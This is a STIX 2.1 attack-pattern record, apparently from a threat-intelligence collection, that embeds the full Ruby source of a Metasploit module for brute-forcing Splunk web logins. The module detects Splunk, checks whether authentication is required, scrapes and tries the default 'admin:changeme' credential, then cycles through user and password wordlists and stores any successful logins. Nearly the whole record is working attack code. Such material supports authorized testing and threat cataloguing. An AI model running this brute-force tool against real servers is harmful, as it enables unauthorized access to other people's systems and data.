{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c0495a7-9fac-4d67-a74c-8a1fc01edecb",
    "created": "2024-08-14T16:29:04.560936Z",
    "modified": "2024-08-14T16:29:04.56094Z",
    "name": "Splunk Web Interface Login Utility",
    "description": " This module simply attempts to login to a Splunk web interface.  Please note the free version of Splunk actually does not require any authentication, in that case the module will abort trying.  Also, some Splunk applications still have the default credential 'admin:changeme' written on the login page.  If this default credential is found, the module will also store that information, and then move on to trying more passwords. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/splunk_web_login.rb",
            "external_id": "splunk_web_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Splunk Web Interface Login Utility',\n      'Description'    => %{\n        This module simply attempts to login to a Splunk web interface.  Please note the\n        free version of Splunk actually does not require any authentication, in that case\n        the module will abort trying.  Also, some Splunk applications still have the\n        default credential 'admin:changeme' written on the login page.  If this default\n        credential is found, the module will also store that information, and then move on\n        to trying more passwords.\n      },\n      'Author'         =>\n        [\n          'Vlatko Kosturjak <kost[at]linux.hr>',\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('URI', [true, \"URI for Splunk Web login. Default is /en-US/account/login\", \"/en-US/account/login\"]),\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ])\n      ])\n  end\n\n  def run_host(ip)\n    if not is_app_splunk?\n      print_error(\"Application does not appear to be Splunk. Module will not continue.\")\n      return\n    end\n\n    print_status(\"Checking if authentication is required...\")\n    if not is_auth_required?\n      print_warning(\"Application does not require authentication.\")\n      return\n    end\n\n    status = try_default_credential\n    return if status == :abort\n\n    print_status(\"Brute-forcing...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n\n  #\n  # What's the point of running this module if the app actually isn't Splunk?\n  #\n  def is_app_splunk?\n    res = send_request_raw({'uri' => datastore['URI']})\n    return (res and res.code == 200 and res.body =~ /Splunk/)\n  end\n\n  def get_login_cookie\n    res = send_request_raw({'uri' => datastore['URI']})\n\n    uid             = ''\n    session_id_port = ''\n    session_id      = ''\n    cval            = ''\n\n    if res and res.code == 200 and !res.get_cookies.empty?\n      res.get_cookies.split(';').each {|c|\n        c.split(',').each {|v|\n          if v.split('=')[0] =~ /cval/\n            cval = v.split('=')[1]\n          elsif v.split('=')[0] =~ /uid/\n            uid = v.split('=')[1]\n          elsif v.split('=')[0] =~ /session_id/\n            session_id_port = v.split('=')[0]\n            session_id = v.split('=')[1]\n          end\n        }\n      }\n      return uid.strip, session_id_port.strip, session_id.strip, cval.strip\n    end\n\n    return nil\n  end\n\n\n  #\n  # Test and see if the default credential works\n  #\n  def try_default_credential\n    p = /Splunk's default credentials are <\\/p><p>username: <span>(.+)<\\/span><br \\/>password: <span>(.+)<\\/span>/\n    res = send_request_raw({'uri' => datastore['URI']})\n    user, pass = res.body.scan(p).flatten\n    do_login(user, pass) if user and pass\n  end\n\n\n  #\n  # The free version of Splunk does not require authentication. Instead, it'll log the\n  # user right in as 'admin'. If that's the case, no point to brute-force, either.\n  #\n  def is_auth_required?\n    uid, session_id_port, session_id, cval = get_login_cookie\n    res = send_request_raw({\n      'uri'    => '/en-US/app/launcher/home',\n      'cookie' => \"uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}\"\n    })\n\n    return (res and res.body =~ /Logged in as (.+)/) ? false : true\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'splunk-web',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n  def do_login(user, pass)\n    vprint_status(\"Trying username:'#{user}' with password:'#{pass}'\")\n    begin\n      cval = ''\n      uid, session_id_port, session_id, cval = get_login_cookie\n      if !uid or !session_id_port or !session_id or !cval\n        print_error(\"Failed to get login cookies, aborting!\")\n        return :abort\n      end\n\n      res = send_request_cgi(\n      {\n        'uri'       => datastore['URI'],\n        'method'    => 'POST',\n        'cookie'    => \"uid=#{uid}; #{session_id_port}=#{session_id}; cval=#{cval}\",\n        'vars_post' =>\n          {\n            'cval'     => cval,\n            'username' => user,\n            'password' => pass\n          }\n      })\n\n      if not res\n        vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}' returned no response\")\n        return :skip_pass\n      end\n\n      unless res.code == 303 || (res.code == 200 && res.body.to_s.index('{\"status\":0}'))\n        vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}\")\n        return :skip_pass\n      end\n\n      print_good(\"SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n      report_cred(ip: datastore['RHOST'], port: datastore['RPORT'], user:user, password: pass, proof: res.code.to_s)\n\n\n      return :next_user\n\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\nend\n"
}